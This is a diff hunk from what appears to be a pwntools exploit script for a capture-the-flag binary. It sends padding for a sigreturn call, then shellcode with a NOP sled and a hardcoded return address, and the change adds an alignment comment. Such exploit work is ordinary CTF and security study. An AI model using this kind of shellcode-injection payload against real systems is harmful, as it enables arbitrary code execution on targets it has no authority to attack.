@@ -41,7 +41,7 @@ p.recv()
 payload = b"C"*15 # send() not sendline() 15 bytes for proper alignment kernel expects 15 bytes when processing the sigreturn system call (syscall number = 0xf). Check syscall table for unix
 p.send(payload)
 p.recv()
-payload3 = shellcode + b"\x90"*17 + p64(0x00000000004010b8)
+payload3 = shellcode + b"\x90"*17 + p64(0x00000000004010b8) # 17 bytes for aliggment(23bytes shell + 17 = 40 off the offset)
 p.send(payload3)
 p.recv()
 # gdb.attach(p)
